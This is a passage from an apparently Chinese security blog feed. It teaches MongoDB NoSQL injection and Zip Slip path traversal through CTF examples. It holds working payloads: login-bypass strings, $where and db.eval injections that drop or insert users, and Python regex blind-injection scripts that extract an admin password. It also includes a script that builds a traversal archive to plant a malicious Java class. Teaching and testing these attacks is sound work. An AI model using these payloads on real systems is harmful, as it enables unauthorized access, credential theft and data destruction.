class="hljs-literal">true</span>&lt;&gt; <span class="hljs-keyword">or</span> (<span class="hljs-string">&#x27;a&#x27;</span>=<span class="hljs-string">&#x27;a&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">password</span> = <span class="hljs-string">&#x27;&#x27;</span>))</code></pre></div><p>这样，原本正常的查询语句会被转换为忽略密码的，在无需密码的情况下直接登录用户账号，因为 <code>()</code> 内的条件总是永真的。</p><h2 id="javascript"><a href="#javascript" class="headerlink" title="javascript"></a>javascript</h2><p>在 MongoDB 中，<code>$where</code> 操作符可以用来执行 JavaScript 代码</p><div class="code-wrapper"><pre><code class="hljs stylus">&gt; db<span class="hljs-selector-class">.users</span><span class="hljs-selector-class">.find</span>(&#123; <span class="hljs-variable">$where</span>: <span class="hljs-string">&quot;function()&#123;return(this.username == &#x27;whoami&#x27;)&#125;&quot;</span> &#125;)&#123; <span class="hljs-string">&quot;_id&quot;</span> : <span class="hljs-built_in">ObjectId</span>(<span class="hljs-string">&quot;60fa9c80257f18542b68c4b9&quot;</span>), <span class="hljs-string">&quot;username&quot;</span> : <span class="hljs-string">&quot;whoami&quot;</span>, <span class="hljs-string">&quot;password&quot;</span> : <span class="hljs-string">&quot;657260&quot;</span> &#125;&gt;</code></pre></div><p>由于使用了 <code>$where</code> 关键字，其后面的 JavaScript 将会被执行并返回 “whoami”，然后将查询出 username 为 whoami 的数据。</p><p>某些易受攻击的 PHP 应用程序在构建 MongoDB 查询时可能会直接插入未经过处理的用户输入，例如从变量中 <code>$userData</code> 获取查询条件：</p><div class="code-wrapper"><pre><code class="hljs routeros">db.users.<span class="hljs-built_in">find</span>(&#123; <span class="hljs-variable">$where</span>: <span class="hljs-string">&quot;function()&#123;return(this.username == <span class="hljs-variable">$userData</span>)&#125;&quot;</span> &#125;)</code></pre></div><p>然后，攻击者可能会注入一种恶意的字符串如 <code>&#39;a&#39;; sleep(5000)</code> ，此时 MongoDB 执行的查询语句为：</p><div class="code-wrapper"><pre><code class="hljs haxe">db.users.find(&#123; $where: <span class="hljs-type"></span>&quot;<span class="hljs-function"><span class="hljs-keyword">function</span></span>()&#123;<span class="hljs-keyword">return</span>(<span class="hljs-built_in">this</span>.username == <span class="hljs-string">&#x27;a&#x27;</span>; sleep(<span class="hljs-number">5000</span>))&#125;<span class="hljs-string">&quot; &#125;)</span></code></pre></div><p>如果此时服务器有 5 秒钟的延迟则说明注入成功。</p><p>测试的服务端代码</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$manager</span> = <span class="hljs-keyword">new</span> MongoDB\Driver\<span class="hljs-title function_ invoke__">Manager</span>(<span class="hljs-string">&quot;mongodb://127.0.0.1:27017&quot;</span>);<span class="hljs-variable">$username</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<span class="hljs-variable">$function</span> = <span class="hljs-string">&quot;</span><span class="hljs-string">function() &#123; </span><span class="hljs-string">    var username = &#x27;&quot;</span>.<span class="hljs-variable">$username</span>.<span class="hljs-string">&quot;&#x27;;</span><span class="hljs-string">    var password = &#x27;&quot;</span>.<span class="hljs-variable">$password</span>.<span class="hljs-string">&quot;&#x27;;</span><span class="hljs-string">    if(username == &#x27;admin&#x27; &amp;&amp; password == &#x27;123456&#x27;)&#123;</span><span class="hljs-string">        return true;</span><span class="hljs-string">    &#125;else&#123;</span><span class="hljs-string">        return false;</span><span class="hljs-string">    &#125;</span><span class="hljs-string">&#125;&quot;</span>;<span class="hljs-variable">$query</span> = <span class="hljs-keyword">new</span> MongoDB\Driver\<span class="hljs-title function_ invoke__">Query</span>(<span class="hljs-keyword">array</span>(    <span class="hljs-string">&#x27;$where&#x27;</span> =&gt; <span class="hljs-variable">$function</span>));<span class="hljs-variable">$result</span> = <span class="hljs-variable">$manager</span>-&gt;<span class="hljs-title function_ invoke__">executeQuery</span>(<span class="hljs-string">&#x27;test.users&#x27;</span>, <span class="hljs-variable">$query</span>)-&gt;<span class="hljs-title function_ invoke__">toArray</span>();<span class="hljs-variable">$count</span> = <span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$result</span>);<span class="hljs-keyword">if</span> (<span class="hljs-variable">$count</span>&gt;<span class="hljs-number">0</span>) &#123;    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$result</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$user</span>) &#123;        <span class="hljs-variable">$user</span>=(<span class="hljs-keyword">array</span>)<span class="hljs-variable">$user</span>;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;====Login Success====&lt;br&gt;&#x27;</span>;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;username: &#x27;</span>.<span class="hljs-variable">$user</span>[<span class="hljs-string">&#x27;username&#x27;</span>].<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;password: &#x27;</span>.<span class="hljs-variable">$user</span>[<span class="hljs-string">&#x27;password&#x27;</span>].<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;    &#125;&#125;<span class="hljs-keyword">else</span>&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Login Failed&#x27;</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre></div><ul><li><strong>MongoDB 2.4 之前</strong></li></ul><p>在 MongoDB 2.4 之前，通过 <code>$where</code> 操作符使用 <code>map-reduce</code>、<code>group</code> 命令可以访问到 Mongo Shell 中的全局函数和属性，如 <code>db</code>，也就是说可以通过自定义 JavaScript 函数来获取数据库的所有信息。</p><p>如下所示，发送以下数据后，如果有回显的话将获取当前数据库下所有的集合名：</p><div class="code-wrapper"><pre><code class="hljs matlab">username=<span class="hljs-number">1</span>&amp;password=<span class="hljs-number">1</span>&#x27;;(<span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">()</span>&#123;<span class="hljs-title">return</span><span class="hljs-params">(tojson(db.getCollectionNames()</span>))&#125;)<span class="hljs-params">()</span>;<span class="hljs-title">var</span> <span class="hljs-title">a</span>=&#x27;1</span></code></pre></div><ul><li><strong>MongoDB 2.4 之后</strong></li></ul><p>MongoDB 2.4 之后 <code>db</code> 属性访问不到了，但我们应然可以构造万能密码。如果此时我们发送以下这几种数据：</p><div class="code-wrapper"><pre><code class="hljs routeros"><span class="hljs-attribute">username</span>=1&amp;password=1&#x27;;return <span class="hljs-literal">true</span>//或<span class="hljs-attribute">username</span>=1&amp;password=1&#x27;;return <span class="hljs-literal">true</span>;var <span class="hljs-attribute">a</span>=<span class="hljs-string">&#x27;1</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs wren"><span class="hljs-title function_">array</span>(    &#x27;$<span class="hljs-params">where</span>&#x27; =&gt; &quot;    <span class="hljs-params">function</span>() &#123;         <span class="hljs-keyword">var</span> <span class="hljs-variable">username</span> <span class="hljs-operator">=</span> &#x27;<span class="hljs-number">1</span>&#x27;;        <span class="hljs-keyword">var</span> <span class="hljs-variable">password</span> <span class="hljs-operator">=</span> &#x27;<span class="hljs-number">1</span>&#x27;;<span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<span class="hljs-keyword">var</span> <span class="hljs-variable">a</span><span class="hljs-operator">=</span>&#x27;<span class="hljs-number">1</span>&#x27;;        <span class="hljs-keyword">if</span>(<span class="hljs-variable">username</span> <span class="hljs-operator">==</span> &#x27;<span class="hljs-variable">admin</span>&#x27; <span class="hljs-operator">&amp;&amp;</span> <span class="hljs-variable">password</span> <span class="hljs-operator">==</span> &#x27;<span class="hljs-number">123456</span>&#x27;)&#123;            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;        &#125;<span class="hljs-keyword">else</span>&#123;            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;        &#125;    &#125;<span class="hljs-string">&quot;)</span></code></pre></div><p>我们从代码中可以看出，password 中的 <code>return true</code> 使得整个 JavaScript 代码提前结束并返回了 <code>true</code>，这样就构造出了一个永真的条件并完成了 NoSQL 注入</p><h3 id="使用-Command-方法造成的注入"><a href="#使用-Command-方法造成的注入" class="headerlink" title="使用 Command 方法造成的注入"></a>使用 Command 方法造成的注入</h3><p>在 MongoDB 的服务器端可以通过 <code>db.eval</code> 方法来执行 JavaScript 脚本，如我们可以定义一个 JavaScript 函数，然后通过 <code>db.eval</code> 在服务器端来运行</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$m</span> = <span class="hljs-keyword">new</span> MongoDB\Driver\Manager;<span class="hljs-comment">// Don&#x27;t do this!!!</span><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;field&#x27;</span>];<span class="hljs-comment">// $username is set to &quot;&#x27;); db.users.drop(); print(&#x27;&quot;</span><span class="hljs-variable">$cmd</span> = <span class="hljs-keyword">new</span> \MongoDB\Driver\<span class="hljs-title function_ invoke__">Command</span>( [<span class="hljs-string">&#x27;eval&#x27;</span> =&gt; <span class="hljs-string">&quot;print(&#x27;Hello, <span class="hljs-subst">$username</span>!&#x27;);&quot;</span>] );<span class="hljs-variable">$r</span> = <span class="hljs-variable">$m</span>-&gt;<span class="hljs-title function_ invoke__">executeCommand</span>( <span class="hljs-string">&#x27;dramio&#x27;</span>, <span class="hljs-variable">$cmd</span> );<span class="hljs-meta">?&gt;</span></code></pre></div><p>这样都是很危险的，因为这个就相当于把 Mongo Shell 开放给了用户，如果此时构造下列 payload：</p><div class="code-wrapper"><pre><code class="hljs pgsql">username=<span class="hljs-number">1</span><span class="hljs-string">&#x27;&#125;);db.users.drop();db.user.find(&#123;&#x27;</span>usernam<span class="hljs-string">e&#x27;:&#x27;</span><span class="hljs-number">1</span>username=<span class="hljs-number">1</span><span class="hljs-string">&#x27;&#125;);db.users.insert(&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:123456&quot;&#125;);db.users.find(&#123;&#x27;</span>usernam<span class="hljs-string">e&#x27;:&#x27;</span><span class="hljs-number">1</span></code></pre></div><p>则将改变原本的查询语句造成注入。如果当前应用连接数据库的权限恰好很高，我们能干的事情就更多了。</p><h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><p>当页面没有回显时，那么我们可以通过 <code>$regex</code> 正则表达式来进行盲注， <code>$regex</code> 可以达到和传统 SQL 注入中 <code>substr()</code> 函数相同的功能</p><p>感觉正则比表达式方便多了</p><p>服务端</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$manager</span> = <span class="hljs-keyword">new</span> MongoDB\Driver\<span class="hljs-title function_ invoke__">Manager</span>(<span class="hljs-string">&quot;mongodb://127.0.0.1:27017&quot;</span>);<span class="hljs-variable">$username</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<span class="hljs-variable">$query</span> = <span class="hljs-keyword">new</span> MongoDB\Driver\<span class="hljs-title function_ invoke__">Query</span>(<span class="hljs-keyword">array</span>(    <span class="hljs-string">&#x27;username&#x27;</span> =&gt; <span class="hljs-variable">$username</span>,    <span class="hljs-string">&#x27;password&#x27;</span> =&gt; <span class="hljs-variable">$password</span>));<span class="hljs-variable">$result</span> = <span class="hljs-variable">$manager</span>-&gt;<span class="hljs-title function_ invoke__">executeQuery</span>(<span class="hljs-string">&#x27;test.users&#x27;</span>, <span class="hljs-variable">$query</span>)-&gt;<span class="hljs-title function_ invoke__">toArray</span>();<span class="hljs-variable">$count</span> = <span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$result</span>);<span class="hljs-keyword">if</span> (<span class="hljs-variable">$count</span> &gt; <span class="hljs-number">0</span>) &#123;    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$result</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$user</span>) &#123;        <span class="hljs-variable">$user</span> = ((<span class="hljs-keyword">array</span>)<span class="hljs-variable">$user</span>);        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;====Login Success====&lt;br&gt;&#x27;</span>;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;username:&#x27;</span> . <span class="hljs-variable">$user</span>[<span class="hljs-string">&#x27;username&#x27;</span>] . <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;password:&#x27;</span> . <span class="hljs-variable">$user</span>[<span class="hljs-string">&#x27;password&#x27;</span>] . <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;    &#125;&#125;<span class="hljs-keyword">else</span>&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Login Failed&#x27;</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs awk">username=admin&amp;password[<span class="hljs-variable">$regex</span>]=.&#123;<span class="hljs-number">4</span>&#125;    <span class="hljs-regexp">//</span> 登录成功username=admin&amp;password[<span class="hljs-variable">$regex</span>]=.&#123;<span class="hljs-number">5</span>&#125;    <span class="hljs-regexp">//</span> 登录成功username=admin&amp;password[<span class="hljs-variable">$regex</span>]=.&#123;<span class="hljs-number">6</span>&#125;    <span class="hljs-regexp">//</span> 登录成功username=admin&amp;password[<span class="hljs-variable">$regex</span>]=.&#123;<span class="hljs-number">7</span>&#125;    <span class="hljs-regexp">//</span> 登录失败......</code></pre></div><p>知道 password 的长度之后我们便可以逐位提取 password 的字符了：</p><div class="code-wrapper"><pre><code class="hljs routeros"><span class="hljs-attribute">username</span>=admin&amp;password[<span class="hljs-variable">$regex</span>]=1.&#123;5&#125;<span class="hljs-attribute">username</span>=admin&amp;password[<span class="hljs-variable">$regex</span>]=12.&#123;4&#125;<span class="hljs-attribute">username</span>=admin&amp;password[<span class="hljs-variable">$regex</span>]=123.&#123;3&#125;<span class="hljs-attribute">username</span>=admin&amp;password[<span class="hljs-variable">$regex</span>]=1234.&#123;2&#125;<span class="hljs-attribute">username</span>=admin&amp;password[<span class="hljs-variable">$regex</span>]=12345.*<span class="hljs-attribute">username</span>=admin&amp;password[<span class="hljs-variable">$regex</span>]=123456或<span class="hljs-attribute">username</span>=admin&amp;password[<span class="hljs-variable">$regex</span>]=^1<span class="hljs-attribute">username</span>=admin&amp;password[<span class="hljs-variable">$regex</span>]=^12<span class="hljs-attribute">username</span>=admin&amp;password[<span class="hljs-variable">$regex</span>]=^123<span class="hljs-attribute">username</span>=admin&amp;password[<span class="hljs-variable">$regex</span>]=^1234<span class="hljs-attribute">username</span>=admin&amp;password[<span class="hljs-variable">$regex</span>]=^12345<span class="hljs-attribute">username</span>=admin&amp;password[<span class="hljs-variable">$regex</span>]=^123456</code></pre></div><p>盲注脚本</p><div class="code-wrapper"><pre><code class="hljs routeros">import requestsimport stringpassword = <span class="hljs-string">&#x27;&#x27;</span>url = <span class="hljs-string">&#x27;http://192.168.226.148/index.php&#x27;</span><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> string.printable:        <span class="hljs-keyword">if</span> c <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> [<span class="hljs-string">&#x27;*&#x27;</span>, <span class="hljs-string">&#x27;+&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-string">&#x27;#&#x27;</span>, <span class="hljs-string">&#x27;&amp;&#x27;</span>, <span class="hljs-string">&#x27;$&#x27;</span>]:            # When the method is <span class="hljs-built_in">GET</span>            get_payload = <span class="hljs-string">&#x27;?username=admin&amp;password[$regex]=^%s&#x27;</span> % (password + c)            # When the method is POST            post_payload = &#123;                <span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>,                <span class="hljs-string">&quot;password[<span class="hljs-variable">$regex</span>]&quot;</span>: <span class="hljs-string">&#x27;^&#x27;</span> + password + c            &#125;            # When the method is POST with JSON            json_payload = <span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;&#123;&quot;</span>username<span class="hljs-string">&quot;:&quot;</span>admin<span class="hljs-string">&quot;, &quot;</span>password<span class="hljs-string">&quot;:&#123;&quot;</span><span class="hljs-variable">$regex</span><span class="hljs-string">&quot;:&quot;</span>^%s<span class="hljs-string">&quot;&#125;&#125;&quot;</span><span class="hljs-string">&quot;&quot;</span> % (password + c)            #headers = &#123;<span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/json&#x27;</span>&#125;            #r = requests.post(<span class="hljs-attribute">url</span>=url, <span class="hljs-attribute">headers</span>=headers, <span class="hljs-attribute">data</span>=json_payload)    # 简单发送 json            r = requests.post(<span class="hljs-attribute">url</span>=url, <span class="hljs-attribute">data</span>=post_payload)            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Login Success&#x27;</span> <span class="hljs-keyword">in</span> r.text:                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] %s&quot;</span> % (password + c))                password += c<span class="hljs-comment"># 输出如下: </span><span class="hljs-comment"># [+] 1</span><span class="hljs-comment"># [+] 12</span><span class="hljs-comment"># [+] 123</span><span class="hljs-comment"># [+] 1234</span><span class="hljs-comment"># [+] 12345</span><span class="hljs-comment"># [+] 123456</span></code></pre></div><h1 id="nodejs中的MongoDB注入"><a href="#nodejs中的MongoDB注入" class="headerlink" title="nodejs中的MongoDB注入"></a>nodejs中的MongoDB注入</h1><p>在处理 MongoDB 查询时，经常会使用 JSON格式将用户提交的数据发送到服务端，如果目标过滤了 <code>$ne</code> 等关键字，我们可以使用 Unicode 编码绕过，因为 JSON 可以直接解析 Unicode。如下所示：</p><div class="code-wrapper"><pre><code class="hljs awk">&#123;<span class="hljs-string">&quot;username&quot;</span>:&#123;<span class="hljs-string">&quot;\u0024\u006e\u0065&quot;</span>:<span class="hljs-number">1</span>&#125;,<span class="hljs-string">&quot;password&quot;</span>: &#123;<span class="hljs-string">&quot;\u0024\u006e\u0065&quot;</span>:<span class="hljs-number">1</span>&#125;&#125;<span class="hljs-regexp">//</span> &#123;<span class="hljs-string">&quot;username&quot;</span>:&#123;<span class="hljs-string">&quot;$ne&quot;</span>:<span class="hljs-number">1</span>&#125;,<span class="hljs-string">&quot;password&quot;</span>: &#123;<span class="hljs-string">&quot;$ne&quot;</span>:<span class="hljs-number">1</span>&#125;&#125;</code></pre></div><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><p>登录框</p><p><img src="/../images/NoSQL%E5%92%8CMongoDB/image-20231129224159040.png" alt="image-20231129224159040"></p><p><img src="/../images/NoSQL%E5%92%8CMongoDB/image-20231129224216029.png" alt="image-20231129224216029"></p><div class="code-wrapper"><pre><code class="hljs bash">构造&#123;<span class="hljs-string">&quot;username&quot;</span>:&#123;<span class="hljs-string">&quot;<span class="hljs-variable">$ne</span>&quot;</span>:1&#125;,<span class="hljs-string">&quot;password&quot;</span>: &#123;<span class="hljs-string">&quot;<span class="hljs-variable">$ne</span>&quot;</span>:1&#125;&#125;</code></pre></div><p><img src="/../images/NoSQL%E5%92%8CMongoDB/image-20231129224324490.png" alt="image-20231129224324490"></p><p><img src="/../images/NoSQL%E5%92%8CMongoDB/image-20231129224332412.png" alt="image-20231129224332412"></p><p>通过 Nosql 盲注，让我们把 admin 的密码爆出来</p><div class="code-wrapper"><pre><code class="hljs routeros">import requestsimport stringpassword = <span class="hljs-string">&#x27;&#x27;</span>url = <span class="hljs-string">&#x27;http://node4.buuoj.cn:27409/login.php&#x27;</span><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> string.printable:        <span class="hljs-keyword">if</span> c <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> [<span class="hljs-string">&#x27;*&#x27;</span>, <span class="hljs-string">&#x27;+&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-string">&#x27;#&#x27;</span>, <span class="hljs-string">&#x27;&amp;&#x27;</span>, <span class="hljs-string">&#x27;$&#x27;</span>]:            # When the method is <span class="hljs-built_in">GET</span>            get_payload = <span class="hljs-string">&#x27;?username=admin&amp;password[$regex]=^%s&#x27;</span> % (password + c)            # When the method is POST            post_payload = &#123;                <span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>,                <span class="hljs-string">&quot;password[<span class="hljs-variable">$regex</span>]&quot;</span>: <span class="hljs-string">&#x27;^&#x27;</span> + password + c            &#125;            # When the method is POST with JSON            json_payload = <span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;&#123;&quot;</span>username<span class="hljs-string">&quot;:&quot;</span>admin<span class="hljs-string">&quot;, &quot;</span>password<span class="hljs-string">&quot;:&#123;&quot;</span>\\u0024\\u0072\\u0065\\u0067\\u0065\\u0078<span class="hljs-string">&quot;:&quot;</span>^%s<span class="hljs-string">&quot;&#125;&#125;&quot;</span><span class="hljs-string">&quot;&quot;</span> % (password + c)            headers = &#123;<span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/json&#x27;</span>&#125;            r = requests.post(<span class="hljs-attribute">url</span>=url, <span class="hljs-attribute">headers</span>=headers, <span class="hljs-attribute">data</span>=json_payload)    # 简单发送 json            #r = requests.post(<span class="hljs-attribute">url</span>=url, <span class="hljs-attribute">data</span>=post_payload)            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;但没完全登录&#x27;</span> <span class="hljs-keyword">in</span> r.content.decode():                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] %s&quot;</span> % (password + c))                password += c<span class="hljs-comment"># 输出:</span><span class="hljs-comment"># [+] 4</span><span class="hljs-comment"># [+] 42</span><span class="hljs-comment"># [+] 422</span><span class="hljs-comment"># [+] 4227</span><span class="hljs-comment"># [+] 42276</span><span class="hljs-comment"># [+] 422766</span><span class="hljs-comment"># ......</span><span class="hljs-comment"># [+] 42276606202db06ad1f29ab6b4a1</span><span class="hljs-comment"># [+] 42276606202db06ad1f29ab6b4a13</span><span class="hljs-comment"># [+] 42276606202db06ad1f29ab6b4a130</span><span class="hljs-comment"># [+] 42276606202db06ad1f29ab6b4a1307</span><span class="hljs-comment"># [+] 42276606202db06ad1f29ab6b4a1307f</span></code></pre></div>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>zipslip任意文件上传与覆盖漏洞</title>
    <link href="/2023/11/28/zipslip%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%8E%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E/"/>
    <url>/2023/11/28/zipslip%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%8E%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="zipslip"><a href="#zipslip" class="headerlink" title="zipslip"></a>zipslip</h1><p>Zip Slip是一种在压缩包中特制(..&#x2F;..&#x2F;..&#x2F;evil.sh)的解压缩文件替换漏洞，包括多种解压缩如tar、jar、war、cpio、apk、rar、7z和zip等</p><p>主要是解压时存在的漏洞</p><p>利用此漏洞的前提：</p><ul><li>压缩文件名称存在<code>..</code>这样的恶意目录穿越字符</li><li>解压代码不会对文件名进行检测，一般直接与路径进行拼接</li></ul><p><img src="/../images/zipslip%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%8E%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E/image-20231129145317902.png" alt="image-20231129145317902"></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><code>windows</code>下无法直接生成带有<code>../</code>这样字符的文件，所以一般用脚本生成</p><div class="code-wrapper"><pre><code class="hljs reasonml">import zipfile<span class="hljs-keyword">if</span> __name__<span class="hljs-operator"> == </span><span class="hljs-string">&quot;__main__&quot;</span>:    <span class="hljs-keyword">try</span>:        zipFile = zipfile.<span class="hljs-constructor">ZipFile(<span class="hljs-string">&quot;poc.zip&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-params">zipfile</span>.ZIP_DEFLATED)</span>        info = zipfile.<span class="hljs-constructor">ZipInfo(<span class="hljs-string">&quot;poc.zip&quot;</span>)</span>        zipFile.write(<span class="hljs-string">&quot;E:/qqq.txt&quot;</span>, <span class="hljs-string">&quot;../../../xixi&quot;</span>, zipfile.ZIP_DEFLATED)        zipFile.close<span class="hljs-literal">()</span>    except IOError <span class="hljs-keyword">as</span> e:        raise eimport zipfilezipFile = zipfile.<span class="hljs-constructor">ZipFile(<span class="hljs-string">&quot;poc.zip&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-params">zipfile</span>.ZIP_DEFLATED)</span>info = zipfile.<span class="hljs-constructor">ZipInfo(<span class="hljs-string">&quot;poc.zip&quot;</span>)</span>zipFile.write(<span class="hljs-string">&quot;./Evil.class&quot;</span>, <span class="hljs-string">&quot;../../../usr/lib/jvm/java-8-openjdk-amd64/jre/classes/Evil.class&quot;</span>, zipfile.ZIP_DEFLATED)zipFile.close<span class="hljs-literal">()</span></code></pre></div><h1 id="题目关于zipslip的部分"><a href="#题目关于zipslip的部分" class="headerlink" title="题目关于zipslip的部分"></a>题目关于zipslip的部分</h1><h2 id="DASCTF-x-CBCTF-2023-Deserialize-Upload"><a href="#DASCTF-x-CBCTF-2023-Deserialize-Upload" class="headerlink" title="DASCTF x CBCTF 2023   Deserialize?Upload!"></a>DASCTF x CBCTF 2023   Deserialize?Upload!</h2><p><a href="https://test-cuycc6s9lprw.feishu.cn/docx/T7budbiSWoTNd4xQGVicHL1Vnpf">DASCTF x CBCTF - 飞书云文档 (feishu.cn)</a></p><p>通过<code>spring-boot-actuator</code>依赖漏洞泄露端点，<code>/actuator/env</code>查看到<code>java_home</code>的路径以及用户名admin</p><p>访问<code>/actuator/heapdump</code>下载文件，并使用工具分析内存得到登陆密码</p><p>登陆上后admin路由存在文件上传</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.nochain.Utils;<span class="hljs-keyword">import</span> java.io.File;<span class="hljs-keyword">import</span> java.io.FileOutputStream;<span class="hljs-keyword">import</span> java.io.InputStream;<span class="hljs-keyword">import</span> java.util.Enumeration;<span class="hljs-keyword">import</span> java.util.zip.ZipEntry;<span class="hljs-keyword">import</span> java.util.zip.ZipFile;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Unzip</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Unzip</span><span class="hljs-params">()</span> &#123;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unzip</span><span class="hljs-params">(File file, Information information, String path)</span> <span class="hljs-keyword">throws</span> Exception &#123;        path = path + <span class="hljs-string">&quot;/&quot;</span>;        <span class="hljs-type">ZipFile</span> <span class="hljs-variable">zipFile</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ZipFile</span>(file);        <span class="hljs-type">Enumeration</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> zipFile.entries();        <span class="hljs-keyword">while</span>(e.hasMoreElements()) &#123;            <span class="hljs-type">ZipEntry</span> <span class="hljs-variable">zipEntry</span> <span class="hljs-operator">=</span> (ZipEntry)e.nextElement();            <span class="hljs-type">String</span> <span class="hljs-variable">filename</span> <span class="hljs-operator">=</span> zipEntry.getName();            information.innerFile.add(filename);            <span class="hljs-type">File</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(path + filename);            f.getParentFile().mkdirs();            f.createNewFile();            <span class="hljs-type">InputStream</span> <span class="hljs-variable">is</span> <span class="hljs-operator">=</span> zipFile.getInputStream(zipEntry);            <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(f);            <span class="hljs-type">int</span> <span class="hljs-variable">length</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;            <span class="hljs-type">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];            <span class="hljs-type">int</span> length;            <span class="hljs-keyword">while</span>((length = is.read(b, <span class="hljs-number">0</span>, <span class="hljs-number">1024</span>)) != -<span class="hljs-number">1</span>) &#123;                fos.write(b, <span class="hljs-number">0</span>, length);            &#125;            is.close();            fos.close();        &#125;        <span class="hljs-keyword">if</span> (zipFile != <span class="hljs-literal">null</span>) &#123;            zipFile.close();        &#125;    &#125;&#125;</code></pre></div><p>对解压的文件没有检测，存在<code>zipslip</code>任意文件上传</p><p>思路就是：构造一个readObject方法中含恶意代码的类后上传至jre&#x2F;classes目录</p><p>。。。。不理解，为什么是<code>java_home</code>的目录，不清楚，没有题目环境</p><div class="code-wrapper"><pre><code class="hljs Java"><span class="hljs-keyword">import</span> java.io.*;<span 